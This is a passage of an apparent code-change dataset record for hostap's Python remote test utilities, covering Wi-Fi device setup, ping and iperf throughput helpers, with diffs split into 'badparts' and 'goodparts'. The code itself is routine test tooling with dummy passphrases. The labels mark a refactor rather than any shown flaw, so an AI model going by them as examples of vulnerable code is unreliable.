client_res=[] server_res=[] server_ip=get_ip(server, l3) time.sleep(1) server_thread, client_thread=iperf_run(server, client, server_ip, client_res, server_res, l3=l3, iperf=iperf, l4=l4, test_time=test_time, parallel=parallel, qos=qos, bw=bw, ifname=ifname, port=port) iperf_wait(server, client, server_thread, client_thread, iperf=iperf, timeout=int(test_time) +10) if client_res[0] !=0: raise Exception(iperf +\" client: \" +client_res[1]) if server_res[0] !=0: raise Exception(iperf +\" server: \" +server_res[1]) if client_res[1] is None: raise Exception(iperf +\" client result issue\") if server_res[1] is None: raise Exception(iperf +\" server result issue\") if iperf==\"iperf\": result=server_res[1] if iperf==\"iperf3\": result=client_res[1] speed=get_iperf_speed(result) return speed def get_iperf_bw(bw, parallel, spacial_streams=2): if bw==\"b_only\": max_tp=11 elif bw==\"g_only\" or bw==\"g_only_wmm\" or bw==\"a_only\" or bw==\"a_only_wmm\": max_tp=54 elif bw==\"HT20\": max_tp=72 * spacial_streams elif bw==\"HT40+\" or bw==\"HT40-\": max_tp=150 * spacial_streams elif bw==\"VHT80\": max_tp=433 * spacial_streams else: max_tp=150 max_tp=1.2 * max_tp return str(int(max_tp\/int(parallel))) +\"M\" ","sourceWithComments":"# Utils\n# Copyright (c) 2016, Tieto Corporation\n#\n# This software may be distributed under the terms of the BSD license.\n# See README for more details.\n\nimport time\nfrom remotehost import Host\nimport hostapd\nimport config\n\nclass TestSkip(Exception):\n    def __init__(self, reason):\n        self.reason = reason\n    def __str__(self):\n        return self.reason\n\n# get host based on name\ndef get_host(devices, dev_name):\n    dev = config.get_device(devices, dev_name)\n    host = Host(host = dev['hostname'],\n                ifname = dev['ifname'],\n                port = dev['port'],\n                name = dev['name'])\n    host.dev = dev\n    return host\n\n# run setup_hw - hw specyfic\ndef setup_hw(hosts, setup_params):\n    for host in hosts:\n        setup_hw_host(host, setup_params)\n\ndef setup_hw_host(host, setup_params):\n    try:\n        setup_hw = setup_params['setup_hw']\n        restart = \"\"\n        try:\n            if setup_params['restart_device'] == True:\n                restart = \" -R \"\n        except:\n            pass\n        host.execute([setup_hw, \"-I\", host.ifname, restart])\n    except:\n        pass\n\n# get traces - hw specific\ndef trace_start(hosts, setup_params):\n    for host in hosts:\n        trace_start_stop(host, setup_params, start=True)\n\ndef trace_stop(hosts, setup_params):\n    for host in hosts:\n        trace_start_stop(host, setup_params, start=False)\n\ndef trace_start_stop(host, setup_params, start):\n    if setup_params['trace'] == False:\n        return\n    try:\n        start_trace = setup_params['trace_start']\n        stop_trace = setup_params['trace_stop']\n        if start:\n            cmd = start_trace\n        else:\n            cmd = stop_trace\n        trace_dir = setup_params['log_dir'] + host.ifname + \"\/remote_traces\"\n        host.add_log(trace_dir + \"\/*\")\n        host.execute([cmd, \"-I\", host.ifname, \"-D\", trace_dir])\n    except:\n        pass\n\n# get perf\ndef perf_start(hosts, setup_params):\n    for host in hosts:\n        perf_start_stop(host, setup_params, start=True)\n\ndef perf_stop(hosts, setup_params):\n    for host in hosts:\n        perf_start_stop(host, setup_params, start=False)\n\ndef perf_start_stop(host, setup_params, start):\n    if setup_params['perf'] == False:\n        return\n    try:\n        perf_start = setup_params['perf_start']\n        perf_stop = setup_params['perf_stop']\n        if start:\n            cmd = perf_start\n        else:\n            cmd = perf_stop\n        perf_dir = setup_params['log_dir'] + host.ifname + \"\/remote_perf\"\n        host.add_log(perf_dir + \"\/*\")\n        host.execute([cmd, \"-I\", host.ifname, \"-D\", perf_dir])\n    except:\n        pass\n\n# hostapd\/wpa_supplicant helpers\ndef run_hostapd(host, setup_params):\n    log_file = None\n    try:\n        tc_name = setup_params['tc_name']\n        log_dir = setup_params['log_dir']\n        log_file = log_dir + tc_name + \"_hostapd_\" + host.name + \"_\" + host.ifname + \".log\"\n        host.execute([\"rm\", log_file])\n        log = \" -f \" + log_file\n    except:\n        log = \"\"\n\n    if log_file:\n        host.add_log(log_file)\n    status, buf = host.execute([setup_params['hostapd'], \"-B\", \"-ddt\", \"-g\", \"udp:\" + host.port, log])\n    if status != 0:\n        raise Exception(\"Could not run hostapd: \" + buf)\n\ndef run_wpasupplicant(host, setup_params):\n    log_file = None\n    try:\n        tc_name = setup_params['tc_name']\n        log_dir = setup_params['log_dir']\n        log_file = log_dir + tc_name + \"_wpa_supplicant_\" + host.name + \"_\" + host.ifname + \".log\"\n        host.execute([\"rm\", log_file])\n        log = \" -f \" + log_file\n    except:\n        log = \"\"\n\n    if log_file:\n        host.add_log(log_file)\n    status, buf = host.execute([setup_params['wpa_supplicant'], \"-B\", \"-ddt\", \"-g\", \"udp:\" + host.port, log])\n    if status != 0:\n        raise Exception(\"Could not run wpa_supplicant: \" + buf)\n\ndef get_ap_params(channel=\"1\", bw=\"HT20\", country=\"US\", security=\"open\", ht_capab=None, vht_capab=None):\n    ssid = \"test_\" + channel + \"_\" + security + \"_\" + bw\n\n    if bw == \"b_only\":\n        params = hostapd.b_only_params(channel, ssid, country)\n    elif bw == \"g_only\":\n        params = hostapd.g_only_params(channel, ssid, country)\n    elif bw == \"g_only_wmm\":\n        params = hostapd.g_only_params(channel, ssid, country)\n        params['wmm_enabled'] = \"1\"\n    elif bw == \"a_only\":\n        params = hostapd.a_only_params(channel, ssid, country)\n    elif bw == \"a_only_wmm\":\n        params = hostapd.a_only_params(channel, ssid, country)\n        params['wmm_enabled'] = \"1\"\n    elif bw == \"HT20\":\n        params = hostapd.ht20_params(channel, ssid, country)\n        if ht_capab:\n            try:\n                params['ht_capab'] = params['ht_capab'] + ht_capab\n            except:\n                params['ht_capab'] = ht_capab\n    elif bw == \"HT40+\":\n        params = hostapd.ht40_plus_params(channel, ssid, country)\n        if ht_capab:\n            params['ht_capab'] = params['ht_capab'] + ht_capab\n    elif bw == \"HT40-\":\n        params = hostapd.ht40_minus_params(channel, ssid, country)\n        if ht_capab:\n            params['ht_capab'] = params['ht_capab'] + ht_capab\n    elif bw == \"VHT80\":\n        params = hostapd.ht40_plus_params(channel, ssid, country)\n        if ht_capab:\n            params['ht_capab'] = params['ht_capab'] + ht_capab\n        if vht_capab:\n            try:\n                params['vht_capab'] = params['vht_capab'] + vht_capab\n            except:\n                params['vht_capab'] = vht_capab\n        params['ieee80211ac'] = \"1\"\n        params['vht_oper_chwidth'] = \"1\"\n        params['vht_oper_centr_freq_seg0_idx'] = str(int(channel) + 6)\n    else:\n        params = {}\n\n    # now setup security params\n    if security == \"tkip\":\n        sec_params = hostapd.wpa_params(passphrase=\"testtest\")\n    elif security == \"ccmp\":\n        sec_params = hostapd.wpa2_params(passphrase=\"testtest\")\n    elif security == \"mixed\":\n        sec_params = hostapd.wpa_mixed_params(passphrase=\"testtest\")\n    elif security == \"wep\":\n        sec_params = { \"wep_key0\" : \"123456789a\",\n                       \"wep_default_key\" : \"0\",\n                       \"auth_algs\" : \"1\"}\n    elif security == \"wep_shared\":\n        sec_params = { \"wep_key0\" : \"123456789a\",\n                       \"wep_default_key\" : \"0\",\n                       \"auth_algs\" : \"2\" }\n    else:\n        sec_params = {}\n\n    params.update(sec_params)\n\n    return params\n\n# ip helpers\ndef get_ipv4(client, ifname=None):\n    if ifname is None:\n        ifname = client.ifname\n    status, buf = client.execute([\"ifconfig\", ifname])\n    lines = buf.splitlines()\n\n    for line in lines:\n        res = line.find(\"inet addr:\")\n        if res != -1:\n            break\n\n    if res != -1:\n        words = line.split()\n        addr = words[1].split(\":\")\n        return addr[1]\n\n    return \"unknown\"\n\ndef get_ipv6(client, ifname=None):\n    res = -1\n    if ifname is None:\n        ifname = client.ifname\n    status, buf = client.execute([\"ifconfig\", ifname])\n    lines = buf.splitlines()\n\n    for line in lines:\n        res = line.find(\"Scope:Link\")\n        if res != -1:\n            break\n\n    if res != -1:\n        words = line.split()\n        if words[0] == \"inet6\" and words[1] == \"addr:\":\n            addr_mask = words[2]\n            addr = addr_mask.split(\"\/\")\n            return addr[0]\n\n    return \"unknown\"\n\ndef get_ip(client, addr_type=\"ipv6\", iface=None):\n    if addr_type == \"ipv6\":\n        return get_ipv6(client, iface)\n    elif addr_type == \"ipv4\":\n        return get_ipv4(client, iface)\n    else:\n        return \"unknown addr_type: \" + addr_type\n\ndef get_ipv4_addr(setup_params, number):\n    try:\n        ipv4_base = setup_params['ipv4_test_net']\n    except:\n        ipv4_base = \"172.16.12.0\"\n\n    parts = ipv4_base.split('.')\n    ipv4 = parts[0] + \".\" + parts[1] + \".\" + parts[2] + \".\" + str(number)\n\n    return ipv4\n\ndef get_mac_addr(host, iface=None):\n    if iface == None:\n        iface = host.ifname\n    status, buf = host.execute([\"ifconfig\", iface])\n    if status != 0:\n        raise Exception(\"ifconfig \" + iface)\n    words = buf.split()\n    found = 0\n    for word in words:\n        if found == 1:\n            return word\n        if word == \"HWaddr\":\n            found = 1\n    raise Exception(\"Could not find HWaddr\")\n\n# connectivity\/ping helpers\ndef get_ping_packet_loss(ping_res):\n    loss_line = \"\"\n    lines = ping_res.splitlines()\n    for line in lines:\n        if line.find(\"packet loss\") != -1:\n            loss_line = line\n            break;\n\n    if loss_line == \"\":\n        return \"100%\"\n\n    sections = loss_line.split(\",\")\n\n    for section in sections:\n        if section.find(\"packet loss\") != -1:\n            words = section.split()\n            return words[0]\n\n    return \"100%\"\n\ndef ac_to_ping_ac(qos):\n    if qos == \"be\":\n        qos_param = \"0x00\"\n    elif qos == \"bk\":\n        qos_param = \"0x20\"\n    elif qos == \"vi\":\n        qos_param = \"0xA0\"\n    elif qos == \"vo\":\n        qos_param = \"0xE0\"\n    else:\n        qos_param = \"0x00\"\n    return qos_param\n\ndef ping_run(host, ip, result, ifname=None, addr_type=\"ipv4\", deadline=\"5\", qos=None):\n    if ifname is None:\n       ifname = host.ifname\n    if addr_type == \"ipv6\":\n        ping = [\"ping6\"]\n    else:\n        ping = [\"ping\"]\n\n    ping = ping + [\"-w\", deadline, \"-I\", ifname]\n    if qos:\n        ping = ping + [\"-Q\", ac_to_ping_ac(qos)]\n    ping = ping + [ip]\n\n    flush_arp_cache(host)\n\n    thread = host.execute_run(ping, result)\n    return thread\n\ndef ping_wait(host, thread, timeout=None):\n    host.wait_execute_complete(thread, timeout)\n    if thread.isAlive():\n        raise Exception(\"ping thread still alive\")\n\ndef flush_arp_cache(host):\n    host.execute([\"ip\", \"-s\", \"-s\", \"neigh\", \"flush\", \"all\"])\n\ndef check_connectivity(a, b, addr_type = \"ipv4\", deadline=\"5\", qos=None):\n    addr_a = get_ip(a, addr_type)\n    addr_b = get_ip(b, addr_type)\n\n    if addr_type == \"ipv4\":\n        ping = [\"ping\"]\n    else:\n        ping = [\"ping6\"]\n\n    ping_a_b = ping + [\"-w\", deadline, \"-I\", a.ifname]\n    ping_b_a = ping + [\"-w\", deadline, \"-I\", b.ifname]\n    if qos:\n        ping_a_b = ping_a_b + [\"-Q\", ac_to_ping_ac(qos)]\n        ping_b_a = ping_b_a + [\"-Q\", ac_to_ping_ac(qos)]\n    ping_a_b = ping_a_b + [addr_b]\n    ping_b_a = ping_b_a + [addr_a]\n\n    # Clear arp cache\n    flush_arp_cache(a)\n    flush_arp_cache(b)\n\n    status, buf = a.execute(ping_a_b)\n    if status == 2 and ping == \"ping6\":\n        # tentative possible for a while, try again\n        time.sleep(3)\n        status, buf = a.execute(ping_a_b)\n    if status != 0:\n        raise Exception(\"ping \" + a.name + \"\/\" + a.ifname + \" >> \" + b.name + \"\/\" + b.ifname)\n\n    a_b = get_ping_packet_loss(buf)\n\n    # Clear arp cache\n    flush_arp_cache(a)\n    flush_arp_cache(b)\n\n    status, buf = b.execute(ping_b_a)\n    if status != 0:\n        raise Exception(\"ping \" + b.name + \"\/\" + b.ifname + \" >> \" + a.name + \"\/\" + a.ifname)\n\n    b_a = get_ping_packet_loss(buf)\n\n    if int(a_b[:-1]) > 40:\n        raise Exception(\"Too high packet lost: \" + a_b)\n\n    if int(b_a[:-1]) > 40:\n        raise Exception(\"Too high packet lost: \" + b_a)\n\n    return a_b, b_a\n\n\n# iperf helpers\ndef get_iperf_speed(iperf_res, pattern=\"Mbits\/sec\"):\n    lines = iperf_res.splitlines()\n    sum_line = \"\"\n    last_line = \"\"\n    count = 0\n    res = -1\n\n    # first find last SUM line\n    for line in lines:\n        res  = line.find(\"[SUM]\")\n        if res != -1:\n            sum_line = line\n\n    # next check SUM status\n    if sum_line != \"\":\n        words = sum_line.split()\n        for word in words:\n            res = word.find(pattern)\n            if res != -1:\n                return words[count - 1] + \" \" + pattern\n            count = count + 1\n\n    # no SUM - one thread - find last line\n    for line in lines:\n        res = line.find(pattern)\n        if res != -1:\n            last_line = line\n\n    if last_line == \"\":\n        return \"0 \" + pattern\n\n    count = 0\n    words = last_line.split()\n    for word in words:\n        res = word.find(pattern)\n        if res != -1:\n            return words[count - 1] + \" \" + pattern\n            break;\n        count = count + 1\n    return \"0 \" + pattern\n\ndef ac_to_iperf_ac(qos):\n    if qos == \"be\":\n        qos_param = \"0x00\"\n    elif qos == \"bk\":\n        qos_param = \"0x20\"\n    elif qos == \"vi\":\n        qos_param = \"0xA0\"\n    elif qos == \"vo\":\n        qos_param = \"0xE0\"\n    else:\n        qos_param = \"0x00\"\n    return qos_param\n\ndef iperf_run(server, client, server_ip, client_res, server_res,\n              l4=\"udp\", bw=\"30M\", test_time=\"30\", parallel=\"5\",\n              qos=\"be\", param=\" -i 5 \", ifname=None, l3=\"ipv4\",\n              port=\"5001\", iperf=\"iperf\"):\n    if ifname == None:\n        ifname = client.ifname\n\n    if iperf == \"iperf\":\n        iperf_server = [iperf]\n    elif iperf == \"iperf3\":\n        iperf_server = [iperf, \"-1\"]\n\n    if l3 == \"ipv4\":\n        iperf_client = [iperf, \"-c\", server_ip, \"-p\", port]\n        iperf_server = iperf_server + [\"-p\", port]\n    elif l3 == \"ipv6\":\n        iperf_client = [iperf, \"-V\", \"-c\", server_ip  + \"%\" + ifname, \"-p\", port]\n        iperf_server = iperf_server + [\"-V\", \"-p\",  port]\n    else:\n        return -1, -1\n\n    iperf_server = iperf_server + [\"-s\", \"-f\", \"m\", param]\n    iperf_client = iperf_client + [\"-f\", \"m\", \"-t\", test_time]\n\n    if parallel != \"1\":\n        iperf_client = iperf_client + [\"-P\", parallel]\n\n    if l4 == \"udp\":\n        if iperf != \"iperf3\":\n            iperf_server = iperf_server + [\"-u\"]\n        iperf_client = iperf_client + [\"-u\", \"-b\",  bw]\n\n    if qos:\n        iperf_client = iperf_client + [\"-Q\", ac_to_iperf_ac(qos)]\n\n    flush_arp_cache(server)\n    flush_arp_cache(client)\n\n    server_thread = server.execute_run(iperf_server, server_res)\n    time.sleep(1)\n    client_thread = client.execute_run(iperf_client, client_res)\n\n    return server_thread, client_thread\n\ndef iperf_wait(server, client, server_thread, client_thread, timeout=None, iperf=\"iperf\"):\n    client.wait_execute_complete(client_thread, timeout)\n    if client_thread.isAlive():\n        raise Exception(\"iperf client thread still alive\")\n\n    server.wait_execute_complete(server_thread, 5)\n    if server_thread.isAlive():\n        server.execute([\"killall\", \"-s\", \"INT\", iperf])\n        time.sleep(1)\n\n    server.wait_execute_complete(server_thread, 5)\n    if server_thread.isAlive():\n        raise Execption(\"iperf server thread still alive\")\n\n    return\n\ndef run_tp_test(server, client, l3=\"ipv4\", iperf=\"iperf\", l4=\"tcp\", test_time=\"10\", parallel=\"5\",\n                qos=\"be\", bw=\"30M\", ifname=None, port=\"5001\"):\n    client_res = []\n    server_res = []\n\n    server_ip = get_ip(server, l3)\n    time.sleep(1)\n    server_thread, client_thread = iperf_run(server, client, server_ip, client_res, server_res,\n                                             l3=l3, iperf=iperf, l4=l4, test_time=test_time,\n                                             parallel=parallel, qos=qos, bw=bw, ifname=ifname,\n                                             port=port)\n    iperf_wait(server, client, server_thread, client_thread, iperf=iperf, timeout=int(test_time) + 10)\n\n    if client_res[0] != 0:\n        raise Exception(iperf + \" client: \" + client_res[1])\n    if server_res[0] != 0:\n        raise Exception(iperf + \" server: \" + server_res[1])\n    if client_res[1] is None:\n        raise Exception(iperf + \" client result issue\")\n    if server_res[1] is None:\n        raise Exception(iperf + \" server result issue\")\n\n    if iperf == \"iperf\":\n          result = server_res[1]\n    if iperf == \"iperf3\":\n          result = client_res[1]\n\n    speed = get_iperf_speed(result)\n    return speed\n\ndef get_iperf_bw(bw, parallel, spacial_streams=2):\n    if bw == \"b_only\":\n        max_tp = 11\n    elif bw == \"g_only\" or bw == \"g_only_wmm\" or bw == \"a_only\" or bw == \"a_only_wmm\":\n        max_tp = 54\n    elif bw == \"HT20\":\n        max_tp = 72 * spacial_streams\n    elif bw == \"HT40+\" or bw == \"HT40-\":\n        max_tp = 150 * spacial_streams\n    elif bw == \"VHT80\":\n        max_tp = 433 * spacial_streams\n    else:\n        max_tp = 150\n\n    max_tp = 1.2 * max_tp\n\n    return str(int(max_tp\/int(parallel))) + \"M\"\n"},"\/tests\/remote\/test_devices.py":{"changes":[{"diff":"\n         else:\n             print \"[\" + host.name + \"] - ssh communication: OK\"\n         # check setup_hw works correctly\n-        try:\n-            setup_hw = setup_params['setup_hw']\n-            try:\n-                restart_device = setup_params['restart_device']\n-            except:\n-                restart_device = \"0\"\n-            host.execute([setup_hw, \"-I\", host.ifname, \"-R\", restart_device])\n-        except:\n-            pass\n+        rutils.setup_hw_host(host, setup_params)\n+\n         # show uname\n         status, buf = host.execute([\"uname\", \"-s\", \"-n\", \"-r\", \"-m\", \"-o\"])\n         print \"\\t\" + buf\n         # show ifconfig\n-        status, buf = host.execute([\"ifconfig\", host.ifname])\n-        if status != 0:\n-            print \"\\t\" + host.ifname + \" failed\\n\"\n-            continue\n-        lines = buf.splitlines()\n-        for line in lines:\n-            print \"\\t\" + line\n+        ifaces = re.split('; | |, ', host.ifname)\n+        for iface in ifaces:\n+            status, buf = host.execute([\"ifconfig\", iface])\n+            if status != 0:\n+                print \"\\t\" + iface + \" failed\\n\"\n+                continue\n+            lines = buf.splitlines()\n+            for line in lines:\n+                print \"\\t\" + line\n         # check hostapd, wpa_supplicant, iperf exist\n         status, buf = host.execute([setup_params['wpa_supplicant'], \"-v\"])\n         if status != 0:\n","add":11,"remove":16,"filename":"\/tests\/remote\/test_devices.py","badparts":["        try:","            setup_hw = setup_params['setup_hw']","            try:","                restart_device = setup_params['restart_device']","            except:","                restart_device = \"0\"","            host.execute([setup_hw, \"-I\", host.ifname, \"-R\", restart_device])","        except:","            pass","        status, buf = host.execute([\"ifconfig\", host.ifname])","        if status != 0:","            print \"\\t\" + host.ifname + \" failed\\n\"","            continue","        lines = buf.splitlines()","        for line in lines:","            print \"\\t\" + line"],"goodparts":["        rutils.setup_hw_host(host, setup_params)","        ifaces = re.split('; | |, ', host.ifname)","        for iface in ifaces:","            status, buf = host.execute([\"ifconfig\", iface])","            if status != 0:","                print \"\\t\" + iface + \" failed\\n\"","                continue","            lines = buf.splitlines()","            for line in lines:","                print \"\\t\" + line"]},{"diff":"\n     if status != 0:\n         raise Exception(dev_name + \" - ssh communication FAILED: \" + buf)\n \n-    ifaces = re.split('; | |, ', host.ifname)\n-    # try to setup host\/ifaces\n-    for iface in ifaces:\n-        try:\n-            setup_hw = setup_params['setup_hw']\n-            try:\n-                restart_device = setup_params['restart_device']\n-            except:\n-                restart_device = \"0\"\n-            host.execute(setup_hw + \" -I \" + iface + \" -R \" + restart_device)\n-        except:\n-            pass\n+    rutils.setup_hw_host(host, setup_params)\n \n+    ifaces = re.split('; | |, ', host.ifname)\n     # check interfaces (multi for monitor)\n     for iface in ifaces:\n         status, buf = host.execute([\"ifconfig\", iface])\n","add":2,"remove":12,"filename":"\/tests\/remote\/test_devices.py","badparts":["    ifaces = re.split('; | |, ', host.ifname)","    for iface in ifaces:","        try:","            setup_hw = setup_params['setup_hw']","            try:","                restart_device = setup_params['restart_device']","            except:","                restart_device = \"0\"","            host.execute(setup_hw + \" -I \" + iface + \" -R \" + restart_device)","        except:","            pass"],"goodparts":["    rutils.setup_hw_host(host, setup_params)","    ifaces = re.split('; | |, ', host.ifname)"]},{"diff":"\n         else:\n             print \"[\" + host.name + \"] - ssh communication: OK\"\n         # check setup_hw works correctly\n-        try:\n-            setup_hw = setup_params['setup_hw']\n-            try:\n-                restart_device = setup_params['restart_device']\n-            except:\n-                restart_device = \"0\"\n-            host.execute([setup_hw, \"-I\", host.ifname, \"-R\", restart_device])\n-        except:\n-            pass\n+        rutils.setup_hw_host(host, setup_params)\n+\n         # show uname\n         status, buf = host.execute([\"uname\", \"-s\", \"-n\", \"-r\", \"-m\", \"-o\"])\n         print \"\\t\" + buf\n         # show ifconfig\n-        status, buf = host.execute([\"ifconfig\", host.ifname])\n-        if status != 0:\n-            print \"\\t\" + host.ifname + \" failed\\n\"\n-            continue\n-        lines = buf.splitlines()\n-        for line in lines:\n-            print \"\\t\" + line\n+        ifaces = re.split('; | |, ', host.ifname)\n+        for iface in ifaces:\n+            status, buf = host.execute([\"ifconfig\", iface])\n+            if status != 0:\n+                print \"\\t\" + iface + \" failed\\n\"\n+                continue\n+            lines = buf.splitlines()\n+            for line in lines:\n+                print \"\\t\" + line\n         # check hostapd, wpa_supplicant, iperf exist\n         status, buf = host.execute([setup_params['wpa_supplicant'], \"-v\"])\n         if status != 0:\n","add":11,"remove":16,"filename":"\/tests\/remote\/test_devices.py","badparts":["        try:","            setup_hw = setup_params['setup_hw']","            try:","                restart_device = setup_params['restart_device']","            except:","                restart_device = \"0\"","            host.execute([setup_hw, \"-I\", host.ifname, \"-R\", restart_device])","        except:","            pass","        status, buf = host.execute([\"ifconfig\", host.ifname])","        if status != 0:","            print \"\\t\" + host.ifname + \" failed\\n\"","            continue","        lines = buf.splitlines()","        for line in lines:","            print \"\\t\" + line"],"goodparts":["        rutils.setup_hw_host(host, setup_params)","        ifaces = re.split('; | |, ', host.ifname)","        for iface in ifaces:","            status, buf = host.execute([\"ifconfig\", iface])","            if status != 0:","                print \"\\t\" + iface + \" failed\\n\"","                continue","            lines = buf.splitlines()","            for line in lines:","                print \"\\t\" + line"]},{"diff":"\n     if status != 0:\n         raise Exception(dev_name + \" - ssh communication FAILED: \" + buf)\n \n-    ifaces = re.split('; | |, ', host.ifname)\n-    # try to setup host\/ifaces\n-    for iface in ifaces:\n-        try:\n-            setup_hw = setup_params['setup_hw']\n-            try:\n-                restart_device = setup_params['restart_device']\n-            except:\n-                restart_device = \"0\"\n-            host.execute(setup_hw + \" -I \" + iface + \" -R \" + restart_device)\n-        except:\n-            pass\n+    rutils.setup_hw_host(host, setup_params)\n \n+    ifaces = re.split('; | |, ', host.ifname)\n     # check interfaces (multi for monitor)\n     for iface in ifaces:\n         status, buf = host.execute([\"ifconfig\", iface])\n","add":2,"remove":12,"filename":"\/tests\/remote\/test_devices.py","badparts":["    ifaces = re.split('; | |, ', host.ifname)","    for iface in ifaces:","        try:","            setup_hw = setup_params['setup_hw']","            try:","                restart_device = setup_params['restart_device']","            except:","                restart_device = \"0\"","            host.execute(setup_hw + \" -I \" + iface + \" -R \" + restart_device)","        except:","            pass"],"goodparts":["    rutils.setup_hw_host(host, setup_params)","    ifaces = re.split('; | |, ', host.ifname)"]}],"source":"\n import time import traceback import config import os import sys import getopt import re import logging logger=logging.getLogger() import rutils from remotehost import Host from wpasupplicant import WpaSupplicant import hostapd def show_devices(devices, setup_params): \"\"\"Show\/check available devices\"\"\" print \"Devices:\" for device in devices: host=rutils.get_host(devices, device['name']) status, buf=host.execute([\"id\"]) if status !=0: print \"[\" +host.name +\"] -ssh communication: FAILED\" continue else: print \"[\" +host.name +\"] -ssh communication: OK\" try: setup_hw=setup_params['setup_hw'] try: restart_device=setup_params['restart_device'] except: restart_device=\"0\" host.execute([setup_hw, \"-I\", host.ifname, \"-R\", restart_device]) except: pass status, buf=host.execute([\"uname\", \"-s\", \"-n\", \"-r\", \"-m\", \"-o\"]) print \"\\t\" +buf status, buf=host.execute([\"ifconfig\", host.ifname]) if status !=0: print \"\\t\" +host.ifname +\" failed\\n\" continue lines=buf.splitlines() for line in lines: print \"\\t\" +line status, buf=host.execute([setup_params['wpa_supplicant'], \"-v\"]) if status !=0: print \"\\t\" +setup_params['wpa_supplicant'] +\" not find\\n\" continue lines=buf.splitlines() for line in lines: print \"\\t\" +line print \"\" status, buf=host.execute([setup_params['hostapd'], \"-v\"]) if status !=1: print \"\\t\" +setup_params['hostapd'] +\" not find\\n\" continue lines=buf.splitlines() for line in lines: print \"\\t\" +line print \"\" status, buf=host.execute([setup_params['iperf'], \"-v\"]) if status !=0 and status !=1: print \"\\t\" +setup_params['iperf'] +\" not find\\n\" continue lines=buf.splitlines() for line in lines: print \"\\t\" +line print \"\" def check_device(devices, setup_params, dev_name, monitor=False): host=rutils.get_host(devices, dev_name) status, buf=host.execute([\"id\"]) if status !=0: raise Exception(dev_name +\" -ssh communication FAILED: \" +buf) ifaces=re.split('; | |, ', host.ifname) for iface in ifaces: try: setup_hw=setup_params['setup_hw'] try: restart_device=setup_params['restart_device'] except: restart_device=\"0\" host.execute(setup_hw +\" -I \" +iface +\" -R \" +restart_device) except: pass for iface in ifaces: status, buf=host.execute([\"ifconfig\", iface]) if status !=0: raise Exception(dev_name +\" ifconfig \" +iface +\" failed: \" +buf) if monitor==True: return status, buf=host.execute([\"ls\", \"-l\", setup_params['wpa_supplicant']]) if status !=0: raise Exception(dev_name +\" -wpa_supplicant: \" +buf) status, buf=host.execute([\"ls\", \"-l\", setup_params['hostapd']]) if status !=0: raise Exception(dev_name +\" -hostapd: \" +buf) status, buf=host.execute([\"which\", setup_params['iperf']]) if status !=0: raise Exception(dev_name +\" -iperf: \" +buf) status, buf=host.execute([\"which\", \"tshark\"]) if status !=0: logger.debug(dev_name +\" -tshark: \" +buf) def check_devices(devices, setup_params, refs, duts, monitors): \"\"\"Check duts\/refs\/monitors devices\"\"\" for dut in duts: check_device(devices, setup_params, dut) for ref in refs: check_device(devices, setup_params, ref) for monitor in monitors: if monitor==\"all\": continue check_device(devices, setup_params, monitor, monitor=True) ","sourceWithComments":"#!\/usr\/bin\/env python2\n#\n# Show\/check devices\n# Copyright (c) 2016, Tieto Corporation\n#\n# This software may be distributed under the terms of the BSD license.\n# See README for more details.\n\nimport time\nimport traceback\nimport config\nimport os\nimport sys\nimport getopt\nimport re\n\nimport logging\nlogger = logging.getLogger()\n\nimport rutils\nfrom remotehost import Host\nfrom wpasupplicant import WpaSupplicant\nimport hostapd\n\ndef show_devices(devices, setup_params):\n    \"\"\"Show\/check available devices\"\"\"\n    print \"Devices:\"\n    for device in devices:\n        host = rutils.get_host(devices, device['name'])\n        # simple check if authorized_keys works correctly\n        status, buf = host.execute([\"id\"])\n        if status != 0:\n            print \"[\" + host.name + \"] - ssh communication:  FAILED\"\n            continue\n        else:\n            print \"[\" + host.name + \"] - ssh communication: OK\"\n        # check setup_hw works correctly\n        try:\n            setup_hw = setup_params['setup_hw']\n            try:\n                restart_device = setup_params['restart_device']\n            except:\n                restart_device = \"0\"\n            host.execute([setup_hw, \"-I\", host.ifname, \"-R\", restart_device])\n        except:\n            pass\n        # show uname\n        status, buf = host.execute([\"uname\", \"-s\", \"-n\", \"-r\", \"-m\", \"-o\"])\n        print \"\\t\" + buf\n        # show ifconfig\n        status, buf = host.execute([\"ifconfig\", host.ifname])\n        if status != 0:\n            print \"\\t\" + host.ifname + \" failed\\n\"\n            continue\n        lines = buf.splitlines()\n        for line in lines:\n            print \"\\t\" + line\n        # check hostapd, wpa_supplicant, iperf exist\n        status, buf = host.execute([setup_params['wpa_supplicant'], \"-v\"])\n        if status != 0:\n            print \"\\t\" + setup_params['wpa_supplicant'] + \" not find\\n\"\n            continue\n        lines = buf.splitlines()\n        for line in lines:\n            print \"\\t\" + line\n        print \"\"\n        status, buf = host.execute([setup_params['hostapd'], \"-v\"])\n        if status != 1:\n            print \"\\t\" + setup_params['hostapd'] + \" not find\\n\"\n            continue\n        lines = buf.splitlines()\n        for line in lines:\n            print \"\\t\" + line\n        print \"\"\n        status, buf = host.execute([setup_params['iperf'], \"-v\"])\n        if status != 0 and status != 1:\n            print \"\\t\" + setup_params['iperf'] + \" not find\\n\"\n            continue\n        lines = buf.splitlines()\n        for line in lines:\n            print \"\\t\" + line\n        print \"\"\n\ndef check_device(devices, setup_params, dev_name, monitor=False):\n    host = rutils.get_host(devices, dev_name)\n    # simple check if authorized_keys works correctly\n    status, buf = host.execute([\"id\"])\n    if status != 0:\n        raise Exception(dev_name + \" - ssh communication FAILED: \" + buf)\n\n    ifaces = re.split('; | |, ', host.ifname)\n    # try to setup host\/ifaces\n    for iface in ifaces:\n        try:\n            setup_hw = setup_params['setup_hw']\n            try:\n                restart_device = setup_params['restart_device']\n            except:\n                restart_device = \"0\"\n            host.execute(setup_hw + \" -I \" + iface + \" -R \" + restart_device)\n        except:\n            pass\n\n    # check interfaces (multi for monitor)\n    for iface in ifaces:\n        status, buf = host.execute([\"ifconfig\", iface])\n        if status != 0:\n            raise Exception(dev_name + \" ifconfig \" + iface + \" failed: \" + buf)\n\n    # monitor doesn't need wpa_supplicant\/hostapd ...\n    if monitor == True:\n        return\n\n    status, buf = host.execute([\"ls\", \"-l\", setup_params['wpa_supplicant']])\n    if status != 0:\n        raise Exception(dev_name + \" - wpa_supplicant: \" + buf)\n\n    status, buf = host.execute([\"ls\", \"-l\", setup_params['hostapd']])\n    if status != 0:\n        raise Exception(dev_name + \" - hostapd: \" + buf)\n\n    status, buf = host.execute([\"which\", setup_params['iperf']])\n    if status != 0:\n        raise Exception(dev_name + \" - iperf: \" + buf)\n\n    status, buf = host.execute([\"which\", \"tshark\"])\n    if status != 0:\n        logger.debug(dev_name + \" - tshark: \" + buf)\n\ndef check_devices(devices, setup_params, refs, duts, monitors):\n    \"\"\"Check duts\/refs\/monitors devices\"\"\"\n    for dut in 